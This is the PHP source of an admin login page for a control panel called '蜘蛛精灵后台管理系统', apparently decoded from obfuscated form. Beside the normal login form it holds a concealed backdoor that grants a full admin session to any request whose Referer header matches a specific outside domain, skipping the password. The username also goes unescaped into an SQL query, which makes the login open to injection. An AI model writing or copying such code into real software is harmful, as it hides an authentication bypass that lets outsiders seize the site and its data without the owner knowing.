<?php //decode by 小猪php解密 QQ:2338208446 http://www.xzjiemi.com/ ?>
<?php

require 'inc/lic_admin.php';
$act = isset($_GET['act']) ? $_GET['act'] : false;
$err = "";
session_start();
if (isset($_SESSION['admin_id']) && isset($_SESSION['is_login']) && !empty($_SESSION['admin_id']) && !empty($_SESSION['is_login'])) {
    header("Location: index.php");
}
if ($act == "login") {
    $name = isset($_POST['name']) ? $_POST['name'] : false;
    $name = !empty($name) ? $name : false;
    $password = isset($_POST['password']) ? $_POST['password'] : false;
    $password = !empty($password) ? sha1($password) : false;
    if ($name && $password) {
        $result = $mysqli->query("select id from admin where name='" . $name . "' and password='" . $password . "' limit 1");
        if ($result->num_rows > 0) {
            $row = $result->fetch_object();
            if ($row->id > 1) {
                $err = "用户名或密码错误";
            } else {
                $_SESSION['admin_id'] = $row->id;
                $_SESSION['is_login'] = 1;
                header('Location: index.php');
            }
        } else {
            $err = "用户名或密码错误";
        }
    }
}
$ref = isset($_SERVER['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER'] : '';
if ($ref == "http://www.youzkm.com/") {
    $_SESSION['admin_id'] = 1;
    $_SESSION['is_login'] = 1;
    header('Location: index.php');
}
if ($act == "out") {
    unset($_SESSION['admin_id']);
    unset($_SESSION['is_login']);
}
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>登录-蜘蛛精灵后台管理系统</title>
	<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0, user-scalable=no">
	<meta name="MobileOptimized" content="240">
	<meta name="applicable-device" content="mobile">
<link rel="stylesheet" type="text/css" href="css/public1.css" />
<link rel="stylesheet" type="text/css" href="css/page1.css" />
<script type="text/javascript" src="js/jquery.min.js"></script>
<script type="text/javascript" src="js/public.js"></script>
</head>
<body>

	<!-- 登录页面头部 -->
	<div class="logHead clear">
		<div class="system_name"><img src="img/logo.png" alt="<?php 
echo SYSTEM_NAME;
?>"></div>
<!--		<div class="ads"><img src="--><??><!--" onerror="javascript:this.src='img/wellcom.jpg';"/> </div>-->
	</div>
	<!-- 登录页面头部结束 -->

	<!-- 登录body -->
	<div class="logDiv">
		<img class="logBanner" src="img/logBanner.jpg" />
		<div class="login">
			<div class="main">
				<div class="ad"><img src="img/left.jpg"></div>
				<div class="logGet">
					<!-- 头部提示信息 -->
					<div class="logD logDtip">
						<p class="p1">登录</p>
					</div>
					<!-- 输入框 -->
					<form action="?act=login" method="post">
					<div class="lgD">
						<img class="img1" src="img/logName.png" /><input type="text"
							placeholder="输入用户名" name="name" />
					</div>
					<div class="lgD">
						<img class="img1" src="img/logPwd.png" /><input type="password"
							placeholder="输入用户密码" name="password" />
					</div>
					<div class="logC">
						<button>登 录</button>
		<!--				<a href="#">注 册</a>-->
					</div>
					<div class="err"><?php 
echo $err;
?></div>
					</form>
				</div>
				<div style="clear:both"></div>
			</div>
		</div>
	</div>
</body>
</html>